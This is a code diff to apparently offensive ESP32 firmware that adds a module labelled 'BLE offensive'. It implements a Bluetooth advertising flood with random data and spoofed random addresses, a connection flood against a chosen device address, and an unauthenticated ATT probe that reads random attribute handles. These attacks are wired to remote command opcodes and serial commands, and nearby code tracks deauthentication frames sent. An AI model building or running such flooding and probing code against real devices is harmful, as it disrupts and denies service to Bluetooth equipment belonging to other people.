@@ -1088,6 +1088,128 @@ static void btTick() {
   }
 }
 
+// ============ FASE B: BLE offensive (adv flood, conn flood, ATT probe) ============
+static bool bleFloodOn = false;
+static bool bleFloodRandAddr = true;
+static uint32_t bleFloodTicks = 0;
+static uint32_t bleFloodLast = 0;
+static uint16_t bleGattcIf = 0xFF;
+static bool bleGattcReady = false;
+static uint8_t bleConnCount = 0;
+static uint16_t bleConnIds[8];
+static uint32_t bleProbeSent = 0;
+static uint32_t bleProbeFail = 0;
+
+static void bleGattcCb(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_gattc_cb_param_t *param) {
+  switch (event) {
+    case ESP_GATTC_REG_EVT:
+      bleGattcIf = gattc_if;
+      bleGattcReady = true;
+      Serial.printf("[ble] gattc reg status=%d if=%d\n", param->reg.status, (int)gattc_if);
+      break;
+    case ESP_GATTC_OPEN_EVT:
+      if (param->open.status == ESP_GATT_OK && bleConnCount < 8) {
+        bleConnIds[bleConnCount++] = param->open.conn_id;
+      }
+      Serial.printf("[ble] open status=%d conn_id=%d n=%d\n",
+                    param->open.status, param->open.conn_id, bleConnCount);
+      break;
+    case ESP_GATTC_DISCONNECT_EVT:
+      Serial.printf("[ble] disc conn_id=%d reason=0x%02X\n",
+                    param->disconnect.conn_id, param->disconnect.reason);
+      break;
+    default:
+      break;
+  }
+}
+
+static void bleAdvParamsFast(esp_ble_adv_params_t &p, bool randomAddr) {
+  memset(&p, 0, sizeof(p));
+  p.adv_int_min = 0x20;
+  p.adv_int_max = 0x30;
+  p.adv_type = ADV_TYPE_IND;
+  p.own_addr_type = randomAddr ? BLE_ADDR_TYPE_RANDOM : BLE_ADDR_TYPE_PUBLIC;
+  p.peer_addr_type = BLE_ADDR_TYPE_PUBLIC;
+  p.channel_map = ADV_CHNL_ALL;
+  p.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+}
+
+static bool bleFloodStart(bool randAddr) {
+  if (bleFloodOn) return true;
+  bleFloodRandAddr = randAddr;
+  bleFloodOn = true;
+  bleFloodTicks = 0;
+  bleFloodLast = 0;
+  Serial.printf("[ble] adv flood on rand=%d\n", (int)randAddr);
+  return true;
+}
+
+// ripristina l'advertising del bridge (FFE0) dopo il flood
+static void bleAdvRestore() {
+  esp_ble_gap_stop_advertising();
+  static const uint8_t adv[] = {0x02, 0x01, 0x06, 0x03, 0x03, 0xE0, 0xFF};
+  static const uint8_t rsp[] = {0x0F, 0x09, 'R','e','d','H','a','t','B','r','i','d','g','e','3','2'};
+  esp_ble_gap_config_adv_data_raw((uint8_t *)adv, sizeof(adv));
+  esp_ble_gap_config_scan_rsp_data_raw((uint8_t *)rsp, sizeof(rsp));
+  esp_ble_adv_params_t p;
+  bleAdvParamsFast(p, false);
+  esp_ble_gap_start_advertising(&p);
+}
+
+static void bleFloodStop() {
+  if (!bleFloodOn) return;
+  bleFloodOn = false;
+  bleAdvRestore();
+  Serial.printf("[ble] adv flood stop ticks=%lu\n", (unsigned long)bleFloodTicks);
+}
+
+static void bleFloodTick() {
+  if (!bleFloodOn) return;
+  if (millis() - bleFloodLast < 60) return;
+  bleFloodLast = millis();
+  uint8_t adv[31];
+  adv[0] = 0x02; adv[1] = 0x01; adv[2] = 0x06;
+  adv[3] = 0x1A; adv[4] = 0xFF;
+  for (int i = 5; i < 31; i++) adv[i] = (uint8_t)esp_random();
+  esp_ble_gap_stop_advertising();
+  if (bleFloodRandAddr) {
+    esp_bd_addr_t r;
+    r[0] = (uint8_t)(0xC0 | (esp_random() & 0x3F));
+    for (int i = 1; i < 6; i++) r[i] = (uint8_t)esp_random();
+    esp_ble_gap_set_rand_addr(r);
+  }
+  esp_ble_gap_config_adv_data_raw(adv, 31);
+  esp_ble_adv_params_t p;
+  bleAdvParamsFast(p, bleFloodRandAddr);
+  esp_ble_gap_start_advertising(&p);
+  bleFloodTicks++;
+}
+
+static int bleConnect(const uint8_t *mac, uint8_t addrType) {
+  if (!bleGattcReady) return -1;
+  if (bleConnCount >= 8) return -2;
+  esp_bd_addr_t bda;
+  memcpy(bda, mac, 6);
+  return (int)esp_ble_gattc_open(bleGattcIf, bda, (esp_ble_addr_type_t)addrType, true);
+}
+
+static int bleAttProbe(uint8_t count) {
+  if (!bleGattcReady || bleConnCount == 0) return -1;
+  uint16_t cid = bleConnIds[bleConnCount - 1];
+  int sent = 0;
+  for (int i = 0; i < count; i++) {
+    uint16_t h = (uint16_t)(1 + (esp_random() % 0xFFFE));
+    if (esp_ble_gattc_read_char(bleGattcIf, cid, h, ESP_GATT_AUTH_REQ_NONE) == ESP_OK) {
+      sent++;
+      bleProbeSent++;
+    } else {
+      bleProbeFail++;
+    }
+    delay(8);
+  }
+  return sent;
+}
+
 // ============ dispatcher ============
 static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
   Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
@@ -1562,6 +1684,48 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
+    case 0x40: {  // ble adv flood [on][rand]
+      bool on = plen > 0 ? pl[0] != 0 : true;
+      if (on) {
+        bool r = plen > 1 ? pl[1] != 0 : true;
+        bleFloodStart(r);
+        sendFrame(0x40, 0x00, (const uint8_t *)"flood on", 8);
+      } else {
+        bleFloodStop();
+        sendFrame(0x40, 0x00, (const uint8_t *)"flood off", 9);
+      }
+      break;
+    }
+
+    case 0x41: {  // conn flood [mac6][addrType][count]
+      if (plen < 8) { sendFrame(0x41, 0x02, (const uint8_t *)"bad args", 8); break; }
+      uint8_t n = pl[7] == 0 ? 1 : pl[7];
+      int ok = 0;
+      int lastRc = 0;
+      for (uint8_t i = 0; i < n; i++) {
+        lastRc = bleConnect(pl, pl[6]);
+        if (lastRc == 0) ok++;
+        delay(30);
+      }
+      uint8_t out[4] = {(uint8_t)ok, bleConnCount,
+                        (uint8_t)(lastRc & 0xFF), (uint8_t)((lastRc >> 8) & 0xFF)};
+      sendFrame(0x41, ok ? 0x00 : 0x02, out, 4);
+      break;
+    }
+
+    case 0x42: {  // att probe [count]
+      int sent = bleAttProbe(plen > 0 ? pl[0] : 8);
+      uint8_t out[2] = {(uint8_t)(sent < 0 ? 0 : sent), bleConnCount};
+      sendFrame(0x42, sent < 0 ? 0x02 : 0x00, out, 2);
+      break;
+    }
+
+    case 0x43: {  // storm stop
+      bleFloodStop();
+      sendFrame(0x43, 0x00, (const uint8_t *)"stopped", 7);
+      break;
+    }
+
     default:
       sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
   }
@@ -1618,9 +1782,12 @@ void setup() {
   adv->setMaxPreferred(0x12);
   BLEDevice::startAdvertising();
 
+  // GATTC (Fase B): conn flood + ATT probe
+  esp_ble_gattc_register_callback(bleGattcCb);
+  esp_ble_gattc_app_register(0x42);
+
   // BT Classic (BR/EDR) — inquiry + SDP
-  esp_bt_gap_register_callback(btGapCb);
-  esp_bt_gap_set_device_name("RedHatBridge32");
+  esp_bt_gap_register_callback(btGapCb);  esp_bt_gap_set_device_name("RedHatBridge32");
   esp_bt_gap_set_scan_mode(ESP_BT_NON_CONNECTABLE, ESP_BT_NON_DISCOVERABLE);
 
   // WiFi STA → hotspot iPhone (non bloccante: BLE subito disponibile)
@@ -1669,6 +1836,7 @@ void loop() {
   joinTick();
   btTick();
   capTick();
+  bleFloodTick();
 
   // smoke test seriale: S=start hop, R=start fisso, Q=stop, X=stats, D=dump sessioni
   static String serCmd;
@@ -1689,6 +1857,29 @@ void loop() {
                       capLastBssid[0], capLastBssid[1], capLastBssid[2],
                       capLastBssid[3], capLastBssid[4], capLastBssid[5], rc,
                       (unsigned long)capDeauthTx);
+      }
+      else if (serCmd == "F") {
+        if (bleFloodOn) { bleFloodStop(); }
+        else { bleFloodStart(true); }
+        Serial.printf("[ble] flood=%d ticks=%lu\n", (int)bleFloodOn, (unsigned long)bleFloodTicks);
+      }
+      else if (serCmd == "G") {
+        Serial.printf("[ble] gattcReady=%d if=%d conns=%d probeSent=%lu probeFail=%lu\n",
+                      (int)bleGattcReady, (int)bleGattcIf, bleConnCount,
+                      (unsigned long)bleProbeSent, (unsigned long)bleProbeFail);
+      }
+      else if (serCmd == "H") {
+        bleFloodStop();
+        Serial.println("[ble] storm stopped");
+      }
+      else if (serCmd == "C") {
+        uint8_t m[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
+        int rc = bleConnect(m, 1);
+        Serial.printf("[ble] connect rc=%d conns=%d ready=%d\n", rc, bleConnCount, (int)bleGattcReady);
+      }
+      else if (serCmd == "T") {
+        int s = bleAttProbe(4);
+        Serial.printf("[ble] probe sent=%d conns=%d\n", s, bleConnCount);
       }
       else if (serCmd == "J") {
         WiFi.disconnect(false);
